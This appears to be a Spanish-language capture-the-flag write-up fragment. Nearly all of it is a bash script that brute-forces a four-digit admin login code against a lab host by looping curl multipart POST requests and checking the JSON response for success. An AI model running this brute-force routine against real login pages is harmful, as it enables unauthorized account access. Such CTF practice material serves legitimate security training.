# CTF



# ENUMERACIÓN






<pre>
  <code>

#!/bin/bash

# Paleta de colores
RED='\e[1;31m'
GREEN='\e[1;32m'
YELLOW='\e[1;33m'
BLUE='\e[1;34m'
MAGENTA='\e[1;35m'
CYAN='\e[1;36m'
RESET='\e[0m'

# Configuración exacta según el script Python que funciona
URL="http://lifeordead.dl/pageadmincodeloginvalidation.php"
BOUNDARY="---------------------------2893980834370073535710702065"
USER_AGENT="Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0"

# Función para crear el payload exactamente como en el script Python
generate_payload() {
    local code=$1
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"code\"\r\n\r\n%s\r\n--%s--\r\n" "$BOUNDARY" "$code" "$BOUNDARY"
}

# Función principal de fuerza bruta
brute_force() {
    printf "${GREEN}[+] URL objetivo: ${URL}\n${RESET}"
    echo ""
    # Usamos un bucle C-style para compatibilidad con más shells
    for ((i=0; i<10000; i++)); do
        code=$(printf "%04d" $i)
        
        # Generar el payload exactamente como en el script Python
        payload=$(generate_payload "$code")
        
        # Realizar la petición con curl, replicando el comportamiento de requests.post
        response=$(curl -s -X POST \
            -H "User-Agent: ${USER_AGENT}" \
            -H "Accept: */*" \
            -H "Content-Type: multipart/form-data; boundary=${BOUNDARY}" \
            -H "Origin: http://lifeordead.dl" \
            -H "Referer: http://lifeordead.dl/pageadmincodelogin.html" \
            -H "Connection: keep-alive" \
            --data-binary "${payload}" \
            "${URL}")
        
        # Procesar la respuesta JSON
        status=$(echo "$response" | grep -o '"status":"[^"]*"' | cut -d'"' -f4)
        
        if [ "$status" = "success" ]; then
            printf "${GREEN}[+] Codigo encontrado : ${code}\n${RESET}"
            return 0
        fi
    done
    
    printf "${RED}[!] No se encontró ningún código válido\n${RESET}"
    return 1
}

# Ejecutar la función principal
brute_force

</code>
</pre>
